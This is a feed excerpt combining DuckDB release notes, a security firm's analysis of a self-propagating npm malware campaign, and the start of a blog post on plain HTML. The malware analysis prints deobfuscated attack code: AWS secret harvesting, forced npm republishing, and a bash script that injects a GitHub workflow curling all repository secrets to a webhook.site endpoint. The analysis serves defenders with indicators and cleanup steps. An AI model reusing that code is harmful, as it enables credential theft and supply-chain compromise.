      &lt;item&gt;&lt;p&gt;Copying from Iceberg to DuckDB/DuckLake is also supported via the&lt;/p&gt;&lt;code&gt;COPY&lt;/code&gt;statement:&lt;code&gt;COPY FROM DATABASE iceberg_datalake TO duckdb_db;&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Copying from DuckLake/DuckDB to Iceberg needs manual creation of the schemas on the Iceberg side of things:&lt;/p&gt;
        &lt;code&gt;CREATE SCHEMA iceberg_datalake.main; COPY FROM DATABASE duckdb_db TO iceberg_datalake;&lt;/code&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;CLI Progress Bar ETA&lt;/head&gt;
    &lt;p&gt;Community member Rusty Conover (@rustyconover) contributed an ETA (estimated time of arrival) feature to the DuckDB command line client. Estimating the remaining time is a difficult problem as progress measurements can vary a lot due to noise. To alleviate this, the ETA feature first collects some initial performance data, then continues to refine its estimate using a Kalman filter. Here's how it works in practice:&lt;/p&gt;
    &lt;head rend="h3"&gt;&lt;code&gt;FILL&lt;/code&gt; Window Function
        
      &lt;/head&gt;
    &lt;p&gt;Richard (@hawkfish) built a new window function, &lt;code&gt;FILL&lt;/code&gt;, that can be used to interpolate missing values in ordered windows. Here is an example, you can see a missing value between 1 and 42, it's interpolated to 21 in the result.&lt;/p&gt;
    &lt;code&gt;FROM (VALUES (1, 1), (2, NULL), (3, 42)) t(c1, c2)
SELECT fill(c2) OVER (ORDER BY c1) f;
&lt;/code&gt;
    &lt;p&gt;This will be the result:&lt;/p&gt;
    &lt;table&gt;
      &lt;row&gt;
        &lt;cell role="head"&gt;f&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;1&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;21&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;42&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;head rend="h3"&gt;Teradata Connector&lt;/head&gt;
    &lt;p&gt;DuckDB now has a Teradata Connector. A separate blog post will be coming.&lt;/p&gt;
    &lt;head rend="h2"&gt;Performance and Optimizations&lt;/head&gt;
    &lt;head rend="h3"&gt;Sorting Rework&lt;/head&gt;
    &lt;p&gt;Laurens (@lnkuiper) rewrote DuckDB’s sorting implementation (again). This new implementation uses a k-way merge sort to reduce data movement. It is also adaptive to pre-sorted data and uses a new API that makes it possible to use this new sorting code elsewhere in DuckDB, for example in window functions. We are seeing much better thread scaling performance with this implementation. We will publish a separate blog post with more detailed performance measurements.&lt;/p&gt;
    &lt;head rend="h3"&gt;Materializing Common Table Expressions&lt;/head&gt;
    &lt;p&gt;Common table expressions (CTEs) are now materialized by default (instead of inlining them). This both improves performance and resolves some correctness bugs that happened due to inlining. This feature was implemented by Denis Hirn (kryonix), who contributed support for recursive CTEs back in 2020.&lt;/p&gt;
    &lt;head rend="h3"&gt;Checkpointing In-Memory Tables&lt;/head&gt;
    &lt;p&gt;In-memory tables now support checkpointing. This has two key benefits:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;In-memory tables now support compression. This is disabled by default – you can turn it on using:&lt;/p&gt;
        &lt;code&gt;ATTACH ':memory:' AS memory_compressed (COMPRESS);&lt;/code&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Checkpointing triggers vacuuming deleted rows, allowing space to be reclaimed after deletes/truncation.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Distribution&lt;/head&gt;
    &lt;head rend="h3"&gt;MacOS Notarization&lt;/head&gt;
    &lt;p&gt;MacOS has a fairly advanced model to ensure system integrity built around cryptographic signatures along with so-called “notarization” by Apple. We had been signing our binaries for about two years already. Starting from this release, the DuckDB command line utility (&lt;code&gt;duckdb&lt;/code&gt;) and the dynamic library &lt;code&gt;libduckdb…dylib&lt;/code&gt; are released with this notarization. This will reduce the amount of complaints when using web browsers to download our binaries. Unfortunately, macOS does not yet fully support notarization of command line utility, so the “open with double click” use case will still have to wait. The recommended path to install the CLI on macOS is still our install script: &lt;code&gt;curl https://install.duckdb.org | bash&lt;/code&gt;&lt;/p&gt;
    &lt;head rend="h3"&gt;Moved Python Integration to its Own Repository&lt;/head&gt;
    &lt;p&gt;We have been slowly moving language integrations (“clients”) into their own repositories from &lt;code&gt;duckdb/duckdb&lt;/code&gt;. For this release, we moved the Python client to its own repository, &lt;code&gt;duckdb/duckdb-python&lt;/code&gt;. Please make sure to file issues related to the Python client there.&lt;/p&gt;
    &lt;head rend="h2"&gt;Final Thoughts&lt;/head&gt;
    &lt;p&gt;These were a few highlights – but there are many more features and improvements in this release. There have been over 3,500 commits by over 90 contributors since we released v1.3.2. The full release notes can be found on GitHub. We would like to thank our community for providing detailed issue reports and feedback. And our special thanks goes to external contributors, who directly landed features in this release!&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45260611</guid><pubDate>Tue, 16 Sep 2025 11:01:06 +0000</pubDate></item><item><title>Self Propagating NPM Malware Compromises over 40 Packages</title><link>https://www.stepsecurity.io/blog/ctrl-tinycolor-and-40-npm-packages-compromised</link><description>&lt;doc fingerprint="8c2364128c168402"&gt;
  &lt;main&gt;
    &lt;head rend="h2"&gt;Executive Summary&lt;/head&gt;
    &lt;p&gt;The NPM ecosystem is facing another critical supply chain attack. The popular @ctrl/tinycolor package, which receives over 2 million weekly downloads, has been compromised along with more than 40 other packages across multiple maintainers. This attack demonstrates a concerning evolution in supply chain threats - the malware includes a self-propagating mechanism that automatically infects downstream packages, creating a cascading compromise across the ecosystem. The compromised versions have been removed from npm.&lt;/p&gt;
    &lt;p&gt;The incident was discovered by @franky47, who promptly notified the community through a GitHub issue.&lt;/p&gt;
    &lt;p&gt;In this post, we'll dive deep into the payload's mechanics, including deobfuscated code snippets, API call traces, and diagrams to illustrate the attack chain. Our analysis reveals a Webpack-bundled script (bundle.js) that leverages Node.js modules for reconnaissance, harvesting, and propagation; targeting Linux/macOS devs with access to NPM/GitHub/cloud creds.&lt;/p&gt;
    &lt;head rend="h2"&gt;Technical Analysis&lt;/head&gt;
    &lt;p&gt;The attack unfolds through a sophisticated multi-stage chain that leverages Node.js's process.env for opportunistic credential access and employs Webpack-bundled modules for modularity. At the core of this attack is a ~3.6MB minified bundle.js file, which executes asynchronously during npm install. This execution is likely triggered via a hijacked postinstall script embedded in the compromised package.json.&lt;/p&gt;
    &lt;p&gt;Self-Propagation Engineâ&lt;/p&gt;
    &lt;p&gt;The malware includes a self-propagation mechanism through the NpmModule.updatePackage function. This function queries the NPM registry API to fetch up to 20 packages owned by the maintainer, then force-publishes patches to these packages. This creates a cascading compromise effect, recursively injecting the malicious bundle into dependent ecosystems across the NPM registry.&lt;/p&gt;
    &lt;p&gt;Credential Harvestingâ&lt;/p&gt;
    &lt;p&gt;The malware repurposes open-source tools like TruffleHog to scan the filesystem for high-entropy secrets. It searches for patterns such as AWS keys using regular expressions like AKIA[0-9A-Z]{16}. Additionally, the malware dumps the entire process.env, capturing transient tokens such as GITHUB_TOKEN and AWS_ACCESS_KEY_ID.&lt;/p&gt;
    &lt;p&gt;For cloud-specific operations, the malware enumerates AWS Secrets Manager using SDK pagination and accesses Google Cloud Platform secrets via the @google-cloud/secret-manager API. The malware specifically targets the following credentials:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;GitHub personal access tokens&lt;/item&gt;
      &lt;item&gt;AWS access keys (AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY)&lt;/item&gt;
      &lt;item&gt;Google Cloud Platform service credentials&lt;/item&gt;
      &lt;item&gt;Azure credentials&lt;/item&gt;
      &lt;item&gt;Cloud metadata endpoints&lt;/item&gt;
      &lt;item&gt;NPM authentication tokens&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Persistence Mechanismâ&lt;/p&gt;
    &lt;p&gt;The malware establishes persistence by injecting a GitHub Actions workflow file (.github/workflows/shai-hulud-workflow.yml) via a base64-encoded bash script. This workflow triggers on push events and exfiltrates repository secrets using the expression ${{ toJSON(secrets) }} to a command and control endpoint. The malware creates branches by force-merging from the default branch (refs/heads/shai-hulud) using GitHub's /git/refs endpoint.&lt;/p&gt;
    &lt;p&gt;Data Exfiltrationâ&lt;/p&gt;
    &lt;p&gt;The malware aggregates harvested credentials into a JSON payload, which is pretty-printed for readability. It then uploads this data to a new public repository named &lt;code&gt;Shai-Hulud&lt;/code&gt; via the GitHub /user/repos API.&lt;/p&gt;
    &lt;p&gt;The entire attack design assumes Linux or macOS execution environments, checking for os.platform() === 'linux' || 'darwin'. It deliberately skips Windows systems. For a visual breakdown, see the attack flow diagram below:&lt;/p&gt;
    &lt;head rend="h2"&gt;Attack Mechanism&lt;/head&gt;
    &lt;p&gt;The compromise begins with a sophisticated minified JavaScript bundle injected into affected packages like @ctrl/tinycolor. This is not rudimentary malware but rather a sophisticated modular engine that uses Webpack chunks to organize OS utilities, cloud SDKs, and API wrappers.&lt;/p&gt;
    &lt;p&gt;The payload imports six core modules, each serving a specific function in the attack chain.&lt;/p&gt;
    &lt;head rend="h3"&gt;OS Recon (Module 71197)&lt;/head&gt;
    &lt;p&gt;This module calls getSystemInfo() to build a comprehensive system profile containing platform, architecture, platformRaw, and archRaw information. It dumps the entire process.env, capturing sensitive environment variables including AWS_ACCESS_KEY_ID, GITHUB_TOKEN, and other credentials that may be present in the environment.&lt;/p&gt;
    &lt;head rend="h3"&gt;Credential Harvesting Across Clouds&lt;/head&gt;
    &lt;head rend="h4"&gt;AWS (Module 56686)&lt;/head&gt;
    &lt;p&gt;The AWS harvesting module validates credentials using the STS AssumeRoleWithWebIdentityCommand. It then enumerates secrets using the @aws-sdk/client-secrets-manager library.&lt;/p&gt;
    &lt;code&gt;// Deobfuscated AWS harvest snippet
async getAllSecretValues() {
  const secrets = [];
  let nextToken;
  do {
    const resp = await client.send(new ListSecretsCommand({ NextToken: nextToken }));
    for (const secret of resp.SecretList || []) {
      const value = await client.send(new GetSecretValueCommand({ SecretId: secret.ARN }));
      secrets.push({ ARN: secret.ARN, SecretString: value.SecretString, SecretBinary: atob(value.SecretBinary) });  // Base64 decode binaries
    }
    nextToken = resp.NextToken;
  } while (nextToken);
  return secrets;
}&lt;/code&gt;
    &lt;p&gt;The module handles errors such as DecryptionFailure or ResourceNotFoundException silently through decorateServiceException wrappers. It targets all AWS regions via endpoint resolution.&lt;/p&gt;
    &lt;head rend="h4"&gt;GCP (Module 9897)â&lt;/head&gt;
    &lt;p&gt;The GCP module uses @google-cloud/secret-manager to list secrets matching the pattern projects//secrets/. It implements pagination using nextPageToken and returns objects containing the secret name and decoded payload. The module fails silently on PERMISSION_DENIED errors without alerting the user.&lt;/p&gt;
    &lt;head rend="h4"&gt;Filesystem Secret Scanning (Module 94913)&lt;/head&gt;
    &lt;p&gt;This module spawns TruffleHog via child_process.exec('trufflehog filesystem / --json') to scan the entire filesystem. It parses the output for high-entropy matches, such as AWS keys found in ~/.aws/credentials.&lt;/p&gt;
    &lt;head rend="h3"&gt;Propagation Mechanics&lt;/head&gt;
    &lt;head rend="h4"&gt;NPM Pivot (Module 40766)&lt;/head&gt;
    &lt;p&gt;The NPM propagation module parses NPM_TOKEN from either ~/.npmrc or environment variables. After validating the token via the /whoami endpoint, it queries /v1/search?text=maintainer:${username}&amp;amp;size=20 to retrieve packages owned by the maintainer.&lt;/p&gt;
    &lt;code&gt;// Deobfuscated NPM update snippet
async updatePackage(pkg) {
  // Patch package.json (add self as dep?) and publish
  await exec(`npm version patch --force &amp;amp;&amp;amp; npm publish --access public --token ${token}`);
}&lt;/code&gt;
    &lt;p&gt;This creates a cascading effect where an infected package leads to compromised maintainer credentials, which in turn infects all other packages maintained by that user.&lt;/p&gt;
    &lt;head rend="h4"&gt;GitHub Backdoor (Module 82036)â&lt;/head&gt;
    &lt;p&gt;The GitHub backdoor module authenticates via the /user endpoint, requiring repo and workflow scopes. After listing organizations, it injects malicious code via a bash script (Module 941).&lt;/p&gt;
    &lt;p&gt;Here is the line-by-line bash script deconstruction:&lt;/p&gt;
    &lt;code&gt;# Deobfuscated Code snippet
#!/bin/bash
GITHUB_TOKEN="$1"
BRANCH_NAME="shai-hulud"
FILE_NAME=".github/workflows/shai-hulud-workflow.yml"

FILE_CONTENT=$(cat &amp;lt;&amp;lt;'EOF'
on: push  # Trigger on any push
jobs: process
  runs-on: ubuntu-latest
  steps:
  - run: curl -d "$CONTENTS" https://webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7;  # C2 exfil
         echo "$CONTENTS" | base64 -w 0 | base64 -w 0  # Double-base64 for evasion
    env: CONTENTS: ${{ toJSON(secrets) }}  # Dumps all repo secrets (GITHUB_TOKEN, AWS keys, etc.)
EOF
)

github_api() { curl -s -X "$1" -H "Authorization: token $GITHUB_TOKEN" ... "$API_BASE$2" }

REPOS_RESPONSE=$(github_api GET "/user/repos?affiliation=owner,collaborator,organization_member&amp;amp;since=2025-01-01T00:00:00Z&amp;amp;per_page=100")

while IFS= read -r repo; do
  # Get default branch SHA
  REF_RESPONSE=$(github_api GET "/repos/$REPO_FULL_NAME/git/ref/heads/$DEFAULT_BRANCH")
  BASE_SHA=$(jq -r '.object.sha' &amp;lt;&amp;lt;&amp;lt; "$REF_RESPONSE")

  BRANCH_DATA=$(jq -n '{ref: "refs/heads/shai-hulud", sha: "$BASE_SHA"}')
  github_api POST "/repos/$REPO_FULL_NAME/git/refs" "$BRANCH_DATA"  # Handles "already exists" gracefully

  FILE_DATA=$(jq -n '{message: "Add workflow", content: "$(base64 &amp;lt;&amp;lt;&amp;lt; "$FILE_CONTENT")", branch: "shai-hulud"}')
  github_api PUT "/repos/$REPO_FULL_NAME/contents/$FILE_NAME" "$FILE_DATA"  # Overwrites if exists
done&lt;/code&gt;
    &lt;p&gt;This mechanism ensures persistence, as secrets are exfiltrated to the command and control server on the next push event.&lt;/p&gt;
    &lt;head rend="h3"&gt;Exfiltrationâ&lt;/head&gt;
    &lt;p&gt;The malware builds a comprehensive JSON payload containing system information, environment variables, and data from all modules. It then creates a public repository via the GitHub /repos POST endpoint using the function &lt;code&gt;makeRepo('Shai-Hulud')&lt;/code&gt;. The repository is public by default to ensure easy access for the command and control infrastructure.&lt;/p&gt;
    &lt;p&gt;The attack employs several evasion techniques including silent error handling (swallowed via catch {} blocks), no logging output, and disguising TruffleHog execution as a legitimate "security scan."&lt;/p&gt;
    &lt;head rend="h2"&gt;Indicators of Compromise&lt;/head&gt;
    &lt;p&gt;The following indicators can help identify systems affected by this attack:&lt;/p&gt;
    &lt;head rend="h3"&gt;GitHub Search Queries for Detection&lt;/head&gt;
    &lt;p&gt;Use these GitHub search queries to identify potentially compromised repositories across your organization:&lt;/p&gt;
    &lt;head rend="h4"&gt;Search for malicious workflow file&lt;/head&gt;
    &lt;p&gt;Replace &lt;code&gt;ACME&lt;/code&gt; with your GitHub organization name and use the following GitHub search query to discover all instance of &lt;code&gt;shai-hulud-workflow.yml&lt;/code&gt; in your GitHub environment.&lt;/p&gt;
    &lt;p&gt;https://github.com/search?q=org%3AACME+path%3A**%2Fshai-hulud-workflow.yml&amp;amp;type=code&lt;/p&gt;
    &lt;head rend="h4"&gt;Search for malicious branch&lt;/head&gt;
    &lt;p&gt;To find malicious branches, you can use the following Bash script:&lt;/p&gt;
    &lt;code&gt;# List all repos and check for shai-hulud branch
gh repo list YOUR_ORG_NAME --limit 1000 --json nameWithOwner --jq '.[].nameWithOwner' | while read repo; do
  gh api "repos/$repo/branches" --jq '.[] | select(.name == "shai-hulud") | "'$repo' has branch: " + .name'
done&lt;/code&gt;
    &lt;head rend="h3"&gt;File Hashes&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;The malicious bundle.js file has a SHA-256 hash of: &lt;code&gt;46faab8ab153fae6e80e7cca38eab363075bb524edd79e42269217a083628f09&lt;/code&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Network Indicators&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Exfiltration endpoint: &lt;code&gt;https://webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7&lt;/code&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;File System Indicators&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Presence of malicious workflow file: &lt;code&gt;.github/workflows/shai-hulud-workflow.yml&lt;/code&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Suspicious Function Calls&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Calls to &lt;code&gt;NpmModule.updatePackage&lt;/code&gt;function&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Suspicious API Calls&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;AWS API calls to &lt;code&gt;secretsmanager.*.amazonaws.com&lt;/code&gt;endpoints, particularly&lt;code&gt;BatchGetSecretValueCommand&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;GCP API calls to &lt;code&gt;secretmanager.googleapis.com&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;NPM registry queries to &lt;code&gt;registry.npmjs.org/v1/search&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;GitHub API calls to &lt;code&gt;api.github.com/repos&lt;/code&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Suspicious Process Executions&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;TruffleHog execution with arguments &lt;code&gt;filesystem /&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;NPM publish commands with &lt;code&gt;--force&lt;/code&gt;flag&lt;/item&gt;
      &lt;item&gt;Curl commands targeting webhook.site domains&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Affected Packages&lt;/head&gt;
    &lt;p&gt;The following packages have been confirmed as compromised:&lt;/p&gt;
    &lt;head rend="h2"&gt;Immediate Actions Required&lt;/head&gt;
    &lt;p&gt;If you use any of the affected packages, take these actions immediately:&lt;/p&gt;
    &lt;head rend="h3"&gt;Identify and Remove Compromised Packages&lt;/head&gt;
    &lt;code&gt;# Check for affected packages in your project
npm ls @ctrl/tinycolor

# Remove compromised packages
npm uninstall @ctrl/tinycolor

# Search for the known malicious bundle.js by hash
find . -type f -name "*.js" -exec sha256sum {} \; | grep "46faab8ab153fae6e80e7cca38eab363075bb524edd79e42269217a083628f09"&lt;/code&gt;
    &lt;p&gt;â&lt;/p&gt;
    &lt;head rend="h3"&gt;Clean Infected Repositories&lt;/head&gt;
    &lt;head rend="h4"&gt;Remove Malicious GitHub Actions Workflow&lt;/head&gt;
    &lt;code&gt;# Check for and remove the backdoor workflow
rm -f .github/workflows/shai-hulud-workflow.yml

# Look for suspicious 'shai-hulud' branches in all repositories
git ls-remote --heads origin | grep shai-hulud

# Delete any malicious branches found
git push origin --delete shai-hulud&lt;/code&gt;
    &lt;p&gt;â&lt;/p&gt;
    &lt;head rend="h3"&gt;Rotate All Credentials Immediately&lt;/head&gt;
    &lt;p&gt;The malware harvests credentials from multiple sources. Rotate ALL of the following:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;NPM tokens (automation and publish tokens)&lt;/item&gt;
      &lt;item&gt;GitHub personal access tokens&lt;/item&gt;
      &lt;item&gt;GitHub Actions secrets in all repositories&lt;/item&gt;
      &lt;item&gt;SSH keys used for Git operations&lt;/item&gt;
      &lt;item&gt;AWS IAM credentials, access keys, and session tokens&lt;/item&gt;
      &lt;item&gt;Google Cloud service account keys and OAuth tokens&lt;/item&gt;
      &lt;item&gt;Azure service principals and access tokens&lt;/item&gt;
      &lt;item&gt;Any credentials stored in AWS Secrets Manager or GCP Secret Manager&lt;/item&gt;
      &lt;item&gt;API keys found in environment variables&lt;/item&gt;
      &lt;item&gt;Database connection strings&lt;/item&gt;
      &lt;item&gt;Third-party service tokens&lt;/item&gt;
      &lt;item&gt;CI/CD pipeline secrets&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Audit Cloud Infrastructure for Compromise&lt;/head&gt;
    &lt;p&gt;Since the malware specifically targets AWS Secrets Manager and GCP Secret Manager, you need to audit your cloud infrastructure for unauthorized access. The malware uses API calls to enumerate and exfiltrate secrets, so reviewing audit logs is critical to understanding the scope of compromise.&lt;/p&gt;
    &lt;head rend="h4"&gt;AWS Security Audit&lt;/head&gt;
    &lt;p&gt;Start by examining your CloudTrail logs for any suspicious secret access patterns. Look specifically for BatchGetSecretValue, ListSecrets, and GetSecretValue API calls that occurred during the time window when the compromised package may have been installed. Also generate and review IAM credential reports to identify any unusual authentication patterns or newly created access keys.&lt;/p&gt;
    &lt;code&gt;# Check CloudTrail for suspicious secret access
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=BatchGetSecretValue
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=ListSecrets
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=GetSecretValue

# Review IAM credential reports for unusual activity
aws iam get-credential-report --query 'Content'&lt;/code&gt;
    &lt;head rend="h4"&gt;GCP Security Audit&lt;/head&gt;
    &lt;p&gt;For Google Cloud Platform, review your audit logs for any access to the Secret Manager service. The malware uses the @google-cloud/secret-manager library to enumerate secrets, so look for unusual patterns of secret access. Additionally, check for any unauthorized service account key creation, as these could be used for persistent access.&lt;/p&gt;
    &lt;code&gt;# Review secret manager access logs
gcloud logging read "resource.type=secretmanager.googleapis.com" --limit=50 --format=json

# Check for unauthorized service account key creation
gcloud logging read "protoPayload.methodName=google.iam.admin.v1.CreateServiceAccountKey"&lt;/code&gt;
    &lt;head rend="h3"&gt;Monitor for Active Exploitation&lt;/head&gt;
    &lt;head rend="h4"&gt;Network Monitoring&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Block outbound connections to &lt;code&gt;webhook.site&lt;/code&gt;domains immediately&lt;/item&gt;
      &lt;item&gt;Monitor firewall logs for connections to &lt;code&gt;https://webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7&lt;/code&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Implement Security Controls&lt;/head&gt;
    &lt;head rend="h4"&gt;GitHub Security Hardening&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Review and remove unnecessary GitHub Apps and OAuth applications&lt;/item&gt;
      &lt;item&gt;Audit all repository webhooks for unauthorized additions&lt;/item&gt;
      &lt;item&gt;Check deploy keys and repository secrets for all projects&lt;/item&gt;
      &lt;item&gt;Enable branch protection rules to prevent force-pushes&lt;/item&gt;
      &lt;item&gt;Turn on GitHub Secret Scanning alerts&lt;/item&gt;
      &lt;item&gt;Enable Dependabot security updates&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h4"&gt;Ongoing Monitoring&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Set up alerts for any new npm publishes from your organization&lt;/item&gt;
      &lt;item&gt;Monitor CloudTrail/GCP audit logs for secret access patterns&lt;/item&gt;
      &lt;item&gt;Implement regular credential rotation policies&lt;/item&gt;
      &lt;item&gt;Use separate, limited-scope tokens for CI/CD pipelines&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;â&lt;/p&gt;
    &lt;head rend="h3"&gt;For StepSecurity Enterprise Customers&lt;/head&gt;
    &lt;p&gt;The following steps are applicable only for StepSecurity enterprise customers. If you are not an existing enterprise customer, you can start our 14 day free trial by installing the StepSecurity GitHub App to complete the following recovery step.&lt;/p&gt;
    &lt;head rend="h4"&gt;â&lt;lb/&gt;Use NPM Package Cooldown Check&lt;/head&gt;
    &lt;p&gt;The NPMÂ Cooldown check automatically fails a pull request if it introduces an npm package version that was released within the organizationâs configured cooldown period (default: 2 days). Once the cooldown period has passed, the check will clear automatically with no action required. The rationale is simple - most supply chain attacks are detected within the first 24 hours of a malicious package release, and the projects that get compromised are often the ones that rushed to adopt the version immediately. By introducing a short waiting period before allowing new dependencies, teams can reduce their exposure to fresh attacks while still keeping their dependencies up to date.&lt;lb/&gt;Here is an example showing how this check protected a project from using the compromised versions of packages involved in this incident:&lt;/p&gt;
    &lt;p&gt;https://github.com/step-security/test-reporting/pull/16/checks?check_run_id=49850926488&lt;/p&gt;
    &lt;head rend="h4"&gt;Discover Pull Requests upgrading to compromised npm packages&lt;/head&gt;
    &lt;p&gt;We have added a new control specifically to detect pull requests that upgraded to these compromised packages. You can find the new control on the StepSecurity dashboard.&lt;/p&gt;
    &lt;p&gt;â&lt;/p&gt;
    &lt;head rend="h4"&gt;Use StepSecurity Harden-Runner to detect compromised dependencies in CI/CD&lt;/head&gt;
    &lt;p&gt;StepSecurity Harden-Runner adds runtime security monitoring to your GitHub Actions workflows, providing visibility into network calls, file system changes, and process executions during CI/CD runs. Harden-Runner detects the compromised nx packages when they are used in CI/CD. Here is a sample Harden-Runner insights page demonstrating this detection:&lt;/p&gt;
    &lt;p&gt;If you're already using Harden-Runner, we strongly recommend you review recent anomaly detections in your Harden-Runner dashboard. You can get started with Harden-Runner by following the guide at https://docs.stepsecurity.io/harden-runner.&lt;/p&gt;
    &lt;head rend="h4"&gt;Use StepSecurity Artifact Monitor to detect software releases outside of authorized pipelines&lt;/head&gt;
    &lt;p&gt;StepSecurity Artifact Monitor provides real-time detection of unauthorized package releases by continuously monitoring your artifacts across package registries. This tool would have flagged this incident by detecting that the compromised versions were published outside of the project's authorized CI/CD pipeline. The monitor tracks release patterns, verifies provenance, and alerts teams when packages are published through unusual channels or from unexpected locations. By implementing Artifact Monitor, organizations can catch supply chain compromises within minutes rather than hours or days, significantly reducing the window of exposure to malicious packages.&lt;/p&gt;
    &lt;p&gt;Learn more about implementing Artifact Monitor in your security workflow at https://docs.stepsecurity.io/artifact-monitor.&lt;/p&gt;
    &lt;head rend="h2"&gt;Reference&lt;/head&gt;
    &lt;p&gt;â&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45260741</guid><pubDate>Tue, 16 Sep 2025 11:22:03 +0000</pubDate></item><item><title>Robert Redford Has Died</title><link>https://www.nytimes.com/2025/09/16/movies/robert-redford-dead.html</link><description></description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45261159</guid><pubDate>Tue, 16 Sep 2025 12:10:31 +0000</pubDate></item><item><title>FBI couldn't get my husband to decrypt his Tor node so he was jailed for 3 years</title><link>https://old.reddit.com/r/TOR/comments/1ni5drm/the_fbi_couldnt_get_my_husband_to_decrypt_his_tor/</link><description></description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45261163</guid><pubDate>Tue, 16 Sep 2025 12:10:49 +0000</pubDate></item><item><title>Just Use HTML</title><link>https://gomakethings.com/just-use-html/</link><description>&lt;doc fingerprint="ea069e5a691f369c"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Just use HTML&lt;/head&gt;
    &lt;p&gt;I’ve worked on so many projects recently that were more complicated than they needed to be because they used JavaScript to generate HTML.&lt;/p&gt;
    &lt;head rend="h2"&gt;JavaScript is…&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Slower to load&lt;/item&gt;
      &lt;item&gt;Slower to run&lt;/item&gt;
      &lt;item&gt;More prone to breaking&lt;/item&gt;
      &lt;item&gt;Harder to read and reason about&lt;/item&gt;
      &lt;item&gt;Doesn’t actually look like the final output&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;It’s inferior to just using HTML in nearly every way.&lt;/p&gt;
    &lt;p&gt;I’m not saying never use JavaScript, though. I think JS is great at augmenting and enhancing what’s already there, and adding interactivity that cannot (yet) but handled with HTML.&lt;/p&gt;
    &lt;p&gt;Let’s look at two examples…&lt;/p&gt;
    &lt;head rend="h2"&gt;Submitting a form&lt;/head&gt;
    &lt;p&gt;I see this a lot in React and JSX.&lt;/p&gt;
    &lt;p&gt;Every input in a form has an &lt;code&gt;input&lt;/code&gt; listener on it. Any changes to that input update a state property. That property is used to set the value of the input, creating this weird circular logic.&lt;/p&gt;
    &lt;p&gt;(This approach is called “controlled inputs” in React-land, and some devs are slowly moving away from it, finally.)&lt;/p&gt;
    &lt;p&gt;The form submit is often also tied to clicking a &lt;code&gt;&amp;lt;button&amp;gt;&lt;/code&gt; rather than submitting a form, meaning that hitting enter on an input won’t submit the form. This removes a native accessibility feature.&lt;/p&gt;
    &lt;code&gt;function Login () {
	const [username, setUsername] = useState('');
	const [password, setPassword] = useState('');

	function handleSubmit () {
		if (!username || !password) {
			// Show error message
			return;
		}

		fetch('/login', {
			method: 'POST',
			body: JSON.stringify({
				username,
				password
			}),
		});
	}

	return (
		&amp;lt;form onSubmit={event =&amp;gt; event.preventDefault()}&amp;gt;
			&amp;lt;label for="username"&amp;gt;Username&amp;lt;/label&amp;gt;
			&amp;lt;input 
				id="username"
				type="text" 
				onInput={event =&amp;gt; setUsername(event.value)} 
				value={username}
			/&amp;gt;

			&amp;lt;label for="password"&amp;gt;Password&amp;lt;/label&amp;gt;
			&amp;lt;input 
				id="password"
				type="password" 
				onInput={event =&amp;gt; setPassword(event.value)} 
				value={password}
			/&amp;gt;

			&amp;lt;button onClick={handleSubmit}&amp;gt;Submit&amp;lt;/button&amp;gt;
		&amp;lt;/form&amp;gt;
	);
}&lt;/code&gt;
